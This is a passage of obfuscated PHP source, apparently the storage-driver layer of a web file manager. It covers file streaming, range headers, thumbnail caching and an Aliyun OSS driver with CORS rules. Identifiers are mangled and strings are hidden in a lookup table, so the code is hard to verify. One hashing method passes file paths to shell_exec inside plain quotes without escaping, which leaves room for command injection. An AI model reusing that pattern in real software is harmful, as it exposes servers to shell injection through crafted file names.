return md5($_SERVER[¤øïŠ‹²][12]); } $‰¹¿»Ç = $this->iconvSystem($‰¹¿»Ç); if (isset(self::$md5Cache[$‰¹¿»Ç])) { return self::$md5Cache[$‰¹¿»Ç]; } self::$md5Cache[$‰¹¿»Ç] = $this->hashMd5Shell($‰¹¿»Ç); if (!self::$md5Cache[$‰¹¿»Ç]) { self::$md5Cache[$‰¹¿»Ç] = @md5_file($‰¹¿»Ç); } return self::$md5Cache[$‰¹¿»Ç]; } private function hashMd5Shell($¢Ç‹ïÁ”) { $ÈŠ‘Œ¥Í =& $_SERVER[¤øïŠ‹²]; if (!$¢Ç‹ïÁ”) { return md5($ÈŠ‘Œ¥Í[12]); } if (!function_exists($ÈŠ‘Œ¥Í[110])) { return !1; } $ŞÛäÀ• = array($ÈŠ‘Œ¥Í[111], $ÈŠ‘Œ¥Í[112]); $¯¹«õæô = Cache::get($ÈŠ‘Œ¥Í[113]); if (!$¯¹«õæô) { $‘ğÛêõ„ = BASIC_PATH . $ÈŠ‘Œ¥Í[114]; $Ó†¥Ä”ã = md5_file($‘ğÛêõ„); $¯¹«õæô = $ÈŠ‘Œ¥Í[115]; foreach ($ŞÛäÀ• as $ÉÂ¬¼á) { $ü¥ÂÆš = shell_exec($ÉÂ¬¼á . "\40\42{$‘ğÛêõ„}\42"); if ($ü¥ÂÆš && substr(trim($ü¥ÂÆš), 0, 32) == $Ó†¥Ä”ã) { $¯¹«õæô = $ÉÂ¬¼á; break; } } Cache::set($ÈŠ‘Œ¥Í[113], $¯¹«õæô, 3600); } if ($¯¹«õæô == $ÈŠ‘Œ¥Í[115]) { return !1; } $ü¥ÂÆš = shell_exec($¯¹«õæô . "\40\42{$¢Ç‹ïÁ”}\x22"); $ü¥ÂÆš = str_replace($ÈŠ‘Œ¥Í[116], $ÈŠ‘Œ¥Í[12], $ü¥ÂÆš); return substr($ü¥ÂÆš, 0, 32); } public function link($˜ßƒãäÏ) { return $˜ßƒãäÏ; } public function fileOut($üÈËï±Œ, $ï‘³‡„Æ = false, $´™¸€¢Â = false, $‰¿çäŞ = '') { $½ó–”Ì =& $_SERVER[¤øïŠ‹²]; $this->cacheMethod(null, null); if (!$üÈËï±Œ || !$this->exist($üÈËï±Œ)) { show_json(LNG($½ó–”Ì[117]), !1, $´™¸€¢Â); } $®Áõ€Ë‰ = $this->getType() == $½ó–”Ì[118]; $»´Æœ° = $GLOBALS[$½ó–”Ì[6]][$½ó–”Ì[103]][$½ó–”Ì[119]][$½ó–”Ì[120]]; $®¸¾ûú = (double) $GLOBALS[$½ó–”Ì[6]][$½ó–”Ì[103]][$½ó–”Ì[119]][$½ó–”Ì[121]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ê¾ªÉ¿ = $this->infoFull($üÈËï±Œ); $ûõõ¥ = $Ê¾ªÉ¿[$½ó–”Ì[90]]; $ø€Œ¹½ = gmdate($½ó–”Ì[122], $Ê¾ªÉ¿[$½ó–”Ì[99]]); $×ñ—œşñ = $´™¸€¢Â ? $´™¸€¢Â : $this->iconvApp($Ê¾ªÉ¿[$½ó–”Ì[32]]); $ŠÕùôÃÄ = 0; $ã¤„ÁÑ = $ûõõ¥ - 1; $™ˆÕÔ‘ù = $this->ext($×ñ—œşñ); if (in_array($™ˆÕÔ‘ù, array($½ó–”Ì[123], $½ó–”Ì[124], $½ó–”Ì[125], $½ó–”Ì[126]))) { $™ˆÕÔ‘ù = $½ó–”Ì[127]; } if (in_array($™ˆÕÔ‘ù, array($½ó–”Ì[128]))) { $™ˆÕÔ‘ù = $½ó–”Ì[129]; } if (!$‰¿çäŞ) { $‰¿çäŞ = md5($ø€Œ¹½ . $ûõõ¥); } $‰¿çäŞ = $½ó–”Ì[130] . $‰¿çäŞ . $½ó–”Ì[130]; $ú¼ÄˆÎİ = get_file_mime($™ˆÕÔ‘ù); $Ô×Ö—£ô = !0; $Ô×Ö—£ô = isset($_GET[$½ó–”Ì[131]]) ? !1 : !0; if ($ï‘³‡„Æ === !1 && !mime_support($ú¼ÄˆÎİ)) { $ú¼ÄˆÎİ = $½ó–”Ì[132]; } header($½ó–”Ì[133]); header($½ó–”Ì[134] . $ú¼ÄˆÎİ); $“¸Ïê€¹ = rawurlencode($×ñ—œşñ); $“¸Ïê€¹ = $½ó–”Ì[130] . $“¸Ïê€¹ . $½ó–”Ì[135] . $“¸Ïê€¹; if ($ï‘³‡„Æ) { header($½ó–”Ì[136]); header($½ó–”Ì[137]); header($½ó–”Ì[138] . $“¸Ïê€¹); } else { if ($Ô×Ö—£ô) { header($½ó–”Ì[139] . $“¸Ïê€¹); } } $“”¼Ìı¨ = 3600 * 24 * 30; header($½ó–”Ì[140]); header($½ó–”Ì[141]); header($½ó–”Ì[142] . $“”¼Ìı¨); header($½ó–”Ì[143] . gmdate($½ó–”Ì[122], time() + $“”¼Ìı¨) . $½ó–”Ì[144]); if (isset($_SERVER[$½ó–”Ì[145]]) && strtotime($_SERVER[$½ó–”Ì[145]]) == $Ê¾ªÉ¿[$½ó–”Ì[99]]) { header($½ó–”Ì[146], !0, 304); die; } if (isset($_SERVER[$½ó–”Ì[147]]) && $_SERVER[$½ó–”Ì[147]] == $‰¿çäŞ) { header($½ó–”Ì[148] . $‰¿çäŞ, !0, 304); die; } header($½ó–”Ì[148] . $‰¿çäŞ); header($½ó–”Ì[149] . $ø€Œ¹½ . $½ó–”Ì[144]); header($½ó–”Ì[150] . rawurlencode($×ñ—œşñ)); header($½ó–”Ì[151]); header($½ó–”Ì[152] . $ûõõ¥); header($½ó–”Ì[153]); Hook::trigger($½ó–”Ì[154], $üÈËï±Œ, $ûõõ¥, $×ñ—œşñ, $™ˆÕÔ‘ù); if (!$ï‘³‡„Æ && $™ˆÕÔ‘ù == $½ó–”Ì[155]) { if ($ûõõ¥ > 1024 * 1024 * 10) { die; } $óÌÌƒ•· = $this->getContent($üÈËï±Œ); $óÌÌƒ•· = Html::clearSVG($óÌÌƒ•·); header($½ó–”Ì[156] . strlen($óÌÌƒ•·)); echo $óÌÌƒ•·; die; } $Í“ˆÎÒ¸ = strtolower($_SERVER[$½ó–”Ì[157]]); if ($®Áõ€Ë‰ && $Í“ˆÎÒ¸ && $»´Æœ°) { if (strstr($Í“ˆÎÒ¸, $½ó–”Ì[158])) { header($½ó–”Ì[159] . $üÈËï±Œ); } else { if (strstr($Í“ˆÎÒ¸, $½ó–”Ì[160])) { header($½ó–”Ì[161] . $üÈËï±Œ); } else { if (strstr($Í“ˆÎÒ¸, $½ó–”Ì[162])) { header($½ó–”Ì[163] . $üÈËï±Œ); } } } if ($®¸¾ûú) { header($½ó–”Ì[164] . $®¸¾ûú); } return; } if (isset($_SERVER[$½ó–”Ì[165]])) { if (preg_match($½ó–”Ì[166], $_SERVER[$½ó–”Ì[165]], $¢ò”ı¿»)) { $ŠÕùôÃÄ = intval($¢ò”ı¿»[1]); $ŠÕùôÃÄ = $ŠÕùôÃÄ <= 0 ? 0 : ($ŠÕùôÃÄ >= $ã¤„ÁÑ ? $ã¤„ÁÑ : $ŠÕùôÃÄ); if (!empty($¢ò”ı¿»[2])) { $úŒ´˜ = intval($¢ò”ı¿»[2]); $ã¤„ÁÑ = $úŒ´˜ < $ŠÕùôÃÄ ? $ŠÕùôÃÄ : ($úŒ´˜ >= $ã¤„ÁÑ ? $ã¤„ÁÑ : $úŒ´˜); } } header($½ó–”Ì[167]); header("\103\157\x6e\164\x65\x6e\164\55\x52\141\x6e\x67\145\72\40\x62\171\164\145\x73\40{$ŠÕùôÃÄ}\x2d{$ã¤„ÁÑ}\57" . $ûõõ¥); } else { header($½ó–”Ì[168]); } header($½ó–”Ì[169]); header($½ó–”Ì[170]); $²Ô¼¡¿ø = !0; if ($_SERVER[$½ó–”Ì[171]] == $½ó–”Ì[172] && $ûõõ¥ > 1204 * 1024 * 1024 * 2) { $²Ô¼¡¿ø = !1; } if ($²Ô¼¡¿ø) { header($½ó–”Ì[173] . ($ã¤„ÁÑ - $ŠÕùôÃÄ + 1)); } if ($_SERVER[$½ó–”Ì[174]] == $½ó–”Ì[175]) { return; } $¶“Úı¹ = array($½ó–”Ì[176] => !1, $½ó–”Ì[177] => $ŠÕùôÃÄ, $½ó–”Ì[178] => $ã¤„ÁÑ, $½ó–”Ì[179] => $™ˆÕÔ‘ù, $½ó–”Ì[180] => $Ê¾ªÉ¿, $½ó–”Ì[181] => $½ó–”Ì[12], $½ó–”Ì[182] => 0); $¶“Úı¹ = Hook::filter($½ó–”Ì[183], $¶“Úı¹); $ƒªÎ‘¦ = 1024 * 300; $‰ÁÍôı“ = 0; if ($®¸¾ûú) { $‰ÁÍôı“ = intval(1000 * 1000 * ($ƒªÎ‘¦ / $®¸¾ûú)); } while ($ŠÕùôÃÄ <= $ã¤„ÁÑ) { $Áè—¬ğÉ = timeFloat(); check_abort(); $Şœ¶šçô = $ã¤„ÁÑ - $ŠÕùôÃÄ + 1; if ($Şœ¶šçô <= $ƒªÎ‘¦) { $ƒªÎ‘¦ = $Şœ¶šçô; } $óÌÌƒ•· = $this->fileSubstr($üÈËï±Œ, $ŠÕùôÃÄ, $ƒªÎ‘¦); if ($¶“Úı¹[$½ó–”Ì[176]]) { $¶“Úı¹[$½ó–”Ì[181]] = $óÌÌƒ•·; $¶“Úı¹[$½ó–”Ì[182]] = $ŠÕùôÃÄ; $¶“Úı¹ = Hook::filter($½ó–”Ì[184], $¶“Úı¹); $óÌÌƒ•· = $¶“Úı¹[$½ó–”Ì[181]]; } echo $óÌÌƒ•·; $ŠÕùôÃÄ += $ƒªÎ‘¦; if ($ƒªÎ‘¦ == $Şœ¶šçô) { $ŠÕùôÃÄ = $ã¤„ÁÑ + 1; } if ($‰ÁÍôı“) { $ŠŞÑÒí = intval(1000 * 1000 * (timeFloat() - $Áè—¬ğÉ)); $šÃ¢àìÈ = $‰ÁÍôı“ - $ŠŞÑÒí; if ($šÃ¢àìÈ > 5) { usleep($šÃ¢àìÈ); } } } } public function fileOutServer($Ãü¥²áğ, $Ã–ğÓºŸ = false, $ƒ¢„ñ¸• = false, $ÃÄğÔĞì = '') { $this->fileOut($Ãü¥²áğ, $Ã–ğÓºŸ, $ƒ¢„ñ¸•, $ÃÄğÔĞì); } public function fileOutLink($à˜©Õ¦) { header($_SERVER[¤øïŠ‹²][185] . $à˜©Õ¦); die; } public function cacheMethod($ Àòà¸±, $‘ÎâØÖõ, $±ŸÑêòí = null) { $ÚæÓê‰Æ =& $_SERVER[¤øïŠ‹²]; static $˜ÒÓ‰®Ë = array(); $ö¯ÖéÌğ = $‘ÎâØÖõ ? ltrim($this->getPathOuter($‘ÎâØÖõ), $ÚæÓê‰Æ[8]) : $ÚæÓê‰Æ[12]; $…ÏìÉàø = $ÚæÓê‰Æ[186] . $ Àòà¸± . $ÚæÓê‰Æ[187] . rtrim($ö¯ÖéÌğ, $ÚæÓê‰Æ[8]); if (is_null($ Àòà¸±)) { $˜ÒÓ‰®Ë = array(); return; } if (is_null($‘ÎâØÖõ)) { foreach ($˜ÒÓ‰®Ë as $…ÏìÉàø => $Ñˆõñé) { if (!strstr($…ÏìÉàø, $ÚæÓê‰Æ[186] . $ Àòà¸± . $ÚæÓê‰Æ[188])) { continue; } unset($˜ÒÓ‰®Ë[$…ÏìÉàø]); } return; } if ($±ŸÑêòí === $ÚæÓê‰Æ[189]) { unset($˜ÒÓ‰®Ë[$…ÏìÉàø]); return; } if (!is_null($±ŸÑêòí)) { $˜ÒÓ‰®Ë[$…ÏìÉàø] = $±ŸÑêòí; return; } $Ëƒ­åÇ = isset($˜ÒÓ‰®Ë[$…ÏìÉàø]) ? $˜ÒÓ‰®Ë[$…ÏìÉàø] : null; if (!is_null($Ëƒ­åÇ)) { return $Ëƒ­åÇ; } $Ëƒ­åÇ = $this->{$ Àòà¸±}($‘ÎâØÖõ); $˜ÒÓ‰®Ë[$…ÏìÉàø] = $Ëƒ­åÇ; return $Ëƒ­åÇ; } public function cacheMethodInfoSet($ªŞ¿•Äœ, $ˆ±ºä¿±, $µ±ÚàÑ  = false) { $æ«Û¿öÒ =& $_SERVER[¤øïŠ‹²]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($æ«Û¿öÒ[190], $ªŞ¿•Äœ, $ˆ±ºä¿±); $this->cacheMethod($æ«Û¿öÒ[191], $ªŞ¿•Äœ, $ˆ±ºä¿± ? !1 : !0); if (is_array($µ±ÚàÑ )) { $this->cacheMethod($æ«Û¿öÒ[192], $ªŞ¿•Äœ, $µ±ÚàÑ ); } } public function fileOutImage($ˆ¸¯¸˜», $¨œÚ÷ê = 250) { $ºÇšôÂà =& $_SERVER[¤øïŠ‹²]; set_timeout(); if (substr($ˆ¸¯¸˜», 0, 4) == $ºÇšôÂà[162]) { $this->fileOutLink($ˆ¸¯¸˜»); } $‹ªñ­Ú¹ = $this->info($ˆ¸¯¸˜»); $“Äª›ŠÔ = !1; $¹Ê–¯Ã¶ = isset($GLOBALS[$ºÇšôÂà[193]]) ? $GLOBALS[$ºÇšôÂà[193]] : array(); if ($¹Ê–¯Ã¶ && $¹Ê–¯Ã¶[$ºÇšôÂà[194]] == $‹ªñ­Ú¹[$ºÇšôÂà[98]]) { $‹ªñ­Ú¹ = $¹Ê–¯Ã¶; $ª„×ø‰ç = $‹ªñ­Ú¹[$ºÇšôÂà[195]]; if ($ª„×ø‰ç && isset($ª„×ø‰ç[$ºÇšôÂà[196]])) { if ($ª„×ø‰ç[$ºÇšôÂà[196]] <= $¨œÚ÷ê && $ª„×ø‰ç[$ºÇšôÂà[197]] <= $¨œÚ÷ê) { $“Äª›ŠÔ = !0; } } } if ($‹ªñ­Ú¹[$ºÇšôÂà[90]] <= 1024 * 50 || $“Äª›ŠÔ || !function_exists($ºÇšôÂà[198]) || $‹ªñ­Ú¹[$ºÇšôÂà[179]] == $ºÇšôÂà[199]) { return $this->fileOut($ˆ¸¯¸˜», !1, $‹ªñ­Ú¹[$ºÇšôÂà[32]]); } $Üµ½—Ë = kodIO::hashPath($‹ªñ­Ú¹); $ªÇïÏâ = "\143\157\x76\x65\x72\x5f{$Üµ½—Ë}\137{$¨œÚ÷ê}\x2e\x70\x6e\x67"; $à£²˜¢— = IO_PATH_SYSTEM_TEMP . $ºÇšôÂà[200]; $µæÌş = IO::infoFullSimple($à£²˜¢—); $‡¿÷óÂŠ = $µæÌş && is_array($µæÌş) ? $µæÌş[$ºÇšôÂà[98]] : $ºÇšôÂà[12]; if (!$‡¿÷óÂŠ) { $‡¿÷óÂŠ = IO::mkdir($à£²˜¢—); } if ($‹ªñ­Ú¹[$ºÇšôÂà[201]] == $ºÇšôÂà[202] && isset($‹ªñ­Ú¹[$ºÇšôÂà[203]]) && $‹ªñ­Ú¹[$ºÇšôÂà[203]] == kodIO::sourceID($‡¿÷óÂŠ)) { $ŞŸ«– = $‹ªñ­Ú¹[$ºÇšôÂà[204]]; if ($¨œÚ÷ê <= 500) { $åƒúóó = preg_replace($ºÇšôÂà[205], $ºÇšôÂà[206], $‹ªñ­Ú¹[$ºÇšôÂà[32]]); $ŞŸ«– = IO::fileNameExist($‡¿÷óÂŠ, $åƒúóó); } return IO::fileOut(KodIO::make($ŞŸ«–), !1, $‹ªñ­Ú¹[$ºÇšôÂà[32]]); } $½Š°Îš = IO::fileNameExist($‡¿÷óÂŠ, $ªÇïÏâ); if ($½Š°Îš) { return IO::fileOut(KodIO::make($½Š°Îš), !1, $‹ªñ­Ú¹[$ºÇšôÂà[32]]); } if ($¨œÚ÷ê > 1000) { $this->makeImageCover($‡¿÷óÂŠ, $ˆ¸¯¸˜», $ªÇïÏâ, $¨œÚ÷ê); $this->makeImageCover($‡¿÷óÂŠ, $ˆ¸¯¸˜», "\143\157\166\145\x72\137{$Üµ½—Ë}\137\62\x35\x30\x2e\160\x6e\147", 250); $½Š°Îš = IO::fileNameExist($‡¿÷óÂŠ, $ªÇïÏâ); if ($½Š°Îš) { return IO::fileOut(KodIO::make($½Š°Îš), !1, $‹ªñ­Ú¹[$ºÇšôÂà[32]]); } die; } if (!kodIO::allowCover($‹ªñ­Ú¹)) { return $this->fileOut($ˆ¸¯¸˜», !1, $‹ªñ­Ú¹[$ºÇšôÂà[32]]); } $¬êÕÕî” = Cache::get($ªÇïÏâ); if ($¬êÕÕî” == $ºÇšôÂà[207] || $¬êÕÕî” == $ºÇšôÂà[208]) { echo $¬êÕÕî”; die; } Cache::set($ªÇïÏâ, $ºÇšôÂà[208], 60); $¡½¶¥Úï = array($‡¿÷óÂŠ, $‹ªñ­Ú¹[$ºÇšôÂà[98]], $ªÇïÏâ, $¨œÚ÷ê); $¤³–ûú = $ºÇšôÂà[209] . $‹ªñ­Ú¹[$ºÇšôÂà[90]] . $ºÇšôÂà[210] . $ªÇïÏâ . $ºÇšôÂà[211] . $‹ªñ­Ú¹[$ºÇšôÂà[32]] . $ºÇšôÂà[212] . $‹ªñ­Ú¹[$ºÇšôÂà[98]]; TaskQueue::add($ºÇšôÂà[213], $¡½¶¥Úï, $¤³–ûú, $ªÇïÏâ); } public function makeImageCover($ìš¡ºÛç, $÷Úçğ½, $†¬ûÓ, $¶¨óÅ¸¡) { $ƒ‹æÖ¼’ =& $_SERVER[¤øïŠ‹²]; if (IO::fileNameExist($ìš¡ºÛç, $†¬ûÓ)) { return $ƒ‹æÖ¼’[214]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¤å÷‰úå = $this->getPathOuter($÷Úçğ½); $Ô—Ñù†­ = DATA_THUMB . $†¬ûÓ; del_file($Ô—Ñù†­); $•‘–®¬î = IO::copy($¤å÷‰úå, TEMP_FILES, !1, $†¬ûÓ); if (!@file_exists($•‘–®¬î)) { return $ƒ‹æÖ¼’[215]; } ImageThumb::createThumb($•‘–®¬î, $Ô—Ñù†­, $¶¨óÅ¸¡, $¶¨óÅ¸¡ * 10); if (@file_exists($Ô—Ñù†­)) { Cache::remove($†¬ûÓ); return IO::move($Ô—Ñù†­, $ìš¡ºÛç); } Cache::set($†¬ûÓ, $ƒ‹æÖ¼’[207], 600); del_file($Ô—Ñù†­); return $ƒ‹æÖ¼’[216] . $•‘–®¬î . $ƒ‹æÖ¼’[85]; } public function fileOutImageServer($¾Ğí£Å¼, $ş³ìƒ—å = 250) { $this->fileOutImage($¾Ğí£Å¼, $ş³ìƒ—å); } public function fileNameAuto($®•Ú¹, $¨ëÛ˜ç›, $ÜíÏÏ®Ã = REPEAT_RENAME, $™œì÷û© = false) { $—î•®¬ =& $_SERVER[¤øïŠ‹²]; $—¾‰²¢ = $®•Ú¹ === $—î•®¬[12] ? $¨ëÛ˜ç› : rtrim($®•Ú¹, $—î•®¬[8]) . $—î•®¬[8] . $¨ëÛ˜ç›; if ($ÜíÏÏ®Ã == REPEAT_REPLACE || !$this->exist($—¾‰²¢) || $™œì÷û© && $ÜíÏÏ®Ã != REPEAT_RENAME_FOLDER) { return $¨ëÛ˜ç›; } if ($ÜíÏÏ®Ã == REPEAT_SKIP) { return !1; } $çƒ©òÄá = $—î•®¬[10] . get_path_ext($¨ëÛ˜ç›); $çƒ©òÄá = $çƒ©òÄá == $—î•®¬[10] || $™œì÷û© ? $—î•®¬[12] : $çƒ©òÄá; $Øœ°…ã‹ = 1; $ã•ÀÓª = substr($¨ëÛ˜ç›, 0, strlen($¨ëÛ˜ç›) - strlen($çƒ©òÄá)); $Åİüç÷„ = $ã•ÀÓª . "\50{$Øœ°…ã‹}\51{$çƒ©òÄá}"; while ($this->exist(rtrim($®•Ú¹, $—î•®¬[8]) . $—î•®¬[8] . $Åİüç÷„)) { $Åİüç÷„ = $ã•ÀÓª . "\x28{$Øœ°…ã‹}\51{$çƒ©òÄá}"; $Øœ°…ã‹++; } return $Åİüç÷„; } private function fileNameAutoList($²š„Ğ ¯, $Ú­»ª, $©æÚ ÈÅ = false) { $û‹»·ÀÂ =& $_SERVER[¤øïŠ‹²]; $¦ÏÏã£ó = $this->listPath($²š„Ğ ¯, !0); $¦ÏÏã£ó = array_merge($¦ÏÏã£ó[$û‹»·ÀÂ[96]], $¦ÏÏã£ó[$û‹»·ÀÂ[97]]); $Ğé¡ü÷õ = array_to_keyvalue($¦ÏÏã£ó, $û‹»·ÀÂ[12], $û‹»·ÀÂ[32]); $• şô£Ú = $û‹»·ÀÂ[10] . get_path_ext($Ú­»ª); $• şô£Ú = $• şô£Ú == $û‹»·ÀÂ[10] || $©æÚ ÈÅ ? $û‹»·ÀÂ[12] : $• şô£Ú; $Ä’÷Ü­„ = substr($Ú­»ª, 0, strlen($Ú­»ª) - strlen($• şô£Ú)); $¤êŸ’Å = $Ä’÷Ü­„ . "\x28\x30\51{$• şô£Ú}"; for ($©ÎİÏöä = 1; $©ÎİÏöä <= count($Ğé¡ü÷õ) + 1; $©ÎİÏöä++) { $¤êŸ’Å = $Ä’÷Ü­„ . "\50{$©ÎİÏöä}\51{$• şô£Ú}"; if (!in_array_not_case($¤êŸ’Å, $Ğé¡ü÷õ)) { return $¤êŸ’Å; } } return $¤êŸ’Å; } public function listAllFiles($ÛìÃâ£, $ƒ¾€÷) { $’şµÊÅè =& $_SERVER[¤øïŠ‹²]; if (empty($ƒ¾€÷)) { return array(); } $ƒ­¤¾¬å = array_keys($ƒ¾€÷); $–œØ¨Ï = array(); $ÛìÃâ£ = trim($ÛìÃâ£, $’şµÊÅè[8]); foreach ($ƒ¾€÷ as $ıÁ²¾Ú‘ => $ƒ£ ÕÄ) { $ƒ€ŒÜìò = ltrim(substr(trim($ıÁ²¾Ú‘, $’şµÊÅè[8]), strlen($ÛìÃâ£)), $’şµÊÅè[8]); if (substr($ıÁ²¾Ú‘, -1) == $’şµÊÅè[8]) { $ƒ€ŒÜìò = rtrim($ƒ€ŒÜìò, $’şµÊÅè[8]) . $’şµÊÅè[8]; } $–œØ¨Ï = array_merge($–œØ¨Ï, $this->slicePath($ƒ€ŒÜìò)); } $œ‹â­ƒº = array(); foreach (array_unique($–œØ¨Ï) as $êÅîÑÑ) { $ÄØòá®Ã = array($’şµÊÅè[98] => $this->getPathOuter($’şµÊÅè[8] . $ÛìÃâ£ . $’şµÊÅè[8] . $êÅîÑÑ), $’şµÊÅè[89] => 1, $’şµÊÅè[90] => 0); if (substr($êÅîÑÑ, -1) != $’şµÊÅè[8]) { $ÄØòá®Ã[$’şµÊÅè[89]] = 0; $¤»ÛÇ¤Œ = $this->getPath($ÛìÃâ£ . $’şµÊÅè[8] . $êÅîÑÑ); if (isset($ƒ¾€÷[$¤»ÛÇ¤Œ])) { $æìÚ“Öª = $ƒ¾€÷[$¤»ÛÇ¤Œ]; if (isset($æìÚ“Öª[$’şµÊÅè[90]])) { $ÄØòá®Ã[$’şµÊÅè[90]] = intval($æìÚ“Öª[$’şµÊÅè[90]]); } if (isset($æìÚ“Öª[$’şµÊÅè[217]])) { $ÄØòá®Ã[$’şµÊÅè[99]] = intval($æìÚ“Öª[$’şµÊÅè[217]]); } } } $œ‹â­ƒº[] = $ÄØòá®Ã; } return $œ‹â­ƒº; } public function slicePath($—‚Ó± ­) { $êğ˜ã æ =& $_SERVER[¤øïŠ‹²]; $ĞâÀîç” = explode($êğ˜ã æ[8], trim($—‚Ó± ­, $êğ˜ã æ[8])); $û†ñê°Õ = 0; do { ++$û†ñê°Õ; $¯®ïßæ–[] = implode($êğ˜ã æ[8], array_slice($ĞâÀîç”, 0, $û†ñê°Õ)) . $êğ˜ã æ[8]; } while ($û†ñê°Õ < count($ĞâÀîç”)); $¯®ïßæ–[count($ĞâÀîç”) - 1] = $—‚Ó± ­; return $¯®ïßæ–; } public function getHost() { $¡„¥…òç =& $_SERVER[¤øïŠ‹²]; $ÄÎÊóºñ = parse_url(trim($this->domain, $¡„¥…òç[8])); $ìî…°¤ø = isset($ÄÎÊóºñ[$¡„¥…òç[218]]) ? $ÄÎÊóºñ[$¡„¥…òç[218]] : http_type(); $ Ğıåô– = isset($ÄÎÊóºñ[$¡„¥…òç[219]]) ? $ÄÎÊóºñ[$¡„¥…òç[219]] : $ÄÎÊóºñ[$¡„¥…òç[98]]; if (isset($ÄÎÊóºñ[$¡„¥…òç[220]])) { $ Ğıåô– .= $¡„¥…òç[4] . $ÄÎÊóºñ[$¡„¥…òç[220]]; } return $ìî…°¤ø . $¡„¥…òç[221] . $ Ğıåô–; } public function pathEncode($·ä˜éÑ) { $ËÕß»Üı =& $_SERVER[¤øïŠ‹²]; return str_replace($ËÕß»Üı[222], $ËÕß»Üı[8], rawurlencode($·ä˜éÑ)); } public function writeLog($îÔŒäÓ¿ = '', $áàîƒÜí = false) { $ƒøã……Ó =& $_SERVER[¤øïŠ‹²]; $ã•¡¹øÉ = in_array(ACTION, array($ƒøã……Ó[223], $ƒøã……Ó[224])); if (!$ã•¡¹øÉ && !GLOBAL_DEBUG) { return; } $ğğ¸½¶Î = $îÔŒäÓ¿; static $Àí° °‚ = null; if (!$Àí° °‚) { $Àí° °‚ = strtoupper($this->getType()); } $îÔŒäÓ¿ = $Àí° °‚ . $ƒøã……Ó[225] . $îÔŒäÓ¿; if ($áàîƒÜí) { $®ñãã†Ü = error_get_last(); if ($®ñãã†Ü) { $îÔŒäÓ¿ = array($îÔŒäÓ¿, $®ñãã†Ü); } } write_log($îÔŒäÓ¿, $ƒøã……Ó[226]); if ($ã•¡¹øÉ) { throw new Exception($ğğ¸½¶Î); } } } goto A¹’´º¤ù; CØ–ßÁ¡Ñè: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($’À‹›•Ç) { parent::__construct($’À‹›•Ç); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } public function fileOutImage($ôâÚ›Ş‘, $¯š©ËŸú = 250) { $ÜééôÆã =& $_SERVER[¤øïŠ‹²]; if ($this->size($ôâÚ›Ş‘) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ôâÚ›Ş‘, $¯š©ËŸú); } $» ÒéÈü = array($ÜééôÆã[1616] => $ÜééôÆã[1617] . $¯š©ËŸú . $ÜééôÆã[1618]); $¦º¥Ï¯– = $this->link($ôâÚ›Ş‘, $» ÒéÈü); $this->fileOutLink($¦º¥Ï¯–); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($«Ò©Ó–ê) { parent::__construct($«Ò©Ó–ê); $this->setSignVersion($_SERVER[¤øïŠ‹²][260]); } public function uploadFormData($×öŞ«ØÌ, $á†ÎÀƒ‰ = 3600) { return $this->uploadFormDataV2($×öŞ«ØÌ, $á†ÎÀƒ‰); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Øç÷‹¼Ğ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¤øïŠ‹²][1619]; $this->_init($Øç÷‹¼Ğ); } public function _init($‹½¡æÀÁ) { $æå¼ÈìÃ =& $_SERVER[¤øïŠ‹²]; $this->config = $‹½¡æÀÁ; foreach ($‹½¡æÀÁ as $×•ß…Ò => $™çğÚÒÍ) { if (isset($this->{$×•ß…Ò})) { $this->{$×•ß…Ò} = $™çğÚÒÍ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($æå¼ÈìÃ[1620] . LNG($æå¼ÈìÃ[1621])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $šÊê‹éˆ =& $_SERVER[¤øïŠ‹²]; $×ì·‡Ö = new OSS\Model\CorsConfig(); $äÎ›”÷Í = new OSS\Model\CorsRule(); $äÎ›”÷Í->addAllowedOrigin($šÊê‹éˆ[1622]); $äÎ›”÷Í->addAllowedMethod($šÊê‹éˆ[1623]); $äÎ›”÷Í->addAllowedMethod($šÊê‹éˆ[1624]); $äÎ›”÷Í->addAllowedMethod($šÊê‹éˆ[1625]); $äÎ›”÷Í->addAllowedMethod($šÊê‹éˆ[1626]); $äÎ›”÷Í->addAllowedMethod($šÊê‹éˆ[175]); $äÎ›”÷Í->setMaxAgeSeconds(600); $äÎ›”÷Í->addExposeHeader($šÊê‹éˆ[1627]); $äÎ›”÷Í->addAllowedHeader($šÊê‹éˆ[1622]); $×ì·‡Ö->addRule($äÎ›”÷Í); try { $this->client->putBucketCors($this->bucket, $×ì·‡Ö); } catch (OSS\Core\OssException $Æı¡ßÆ«) { $this->writeLog(__FUNCTION__ . $šÊê‹éˆ[225] . $Æı¡ßÆ«->getMessage()); return !1; } return !0; } public function getBucketCors() { $›ÈØûğ =& $_SERVER[¤øïŠ‹²]; $ ãèÉë– = null; try { $ ãèÉë– = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Œ±©„Šñ) { $this->writeLog(__FUNCTION__ . $›ÈØûğ[225] . $Œ±©„Šñ->getMessage()); return null; } if (!$ ãèÉë– || !($üÙí½›‚ = $ ãèÉë–->getRules())) { return null; } $ÆŠ­¢œ = $üÙí½›‚[0]->getAllowedOrigins(); $›„ÜÒÛ = $üÙí½›‚[0]->getAllowedMethods(); $îÎ¢ƒò¸ = $üÙí½›‚[0]->getMaxAgeSeconds(); $µ¦ ù“‘ = $üÙí½›‚[0]->getExposeHeaders(); $ôó’‡§™ = $üÙí½›‚[0]->getAllowedHeaders(); return array($›ÈØûğ[231] => isset($ÆŠ­¢œ[0]) ? $ÆŠ­¢œ[0] : $›ÈØûğ[12], $›ÈØûğ[235] => $›„ÜÒÛ, $›ÈØûğ[1628] => $îÎ¢ƒò¸, $›ÈØûğ[1629] => isset($µ¦ ù“‘[0]) ? $µ¦ 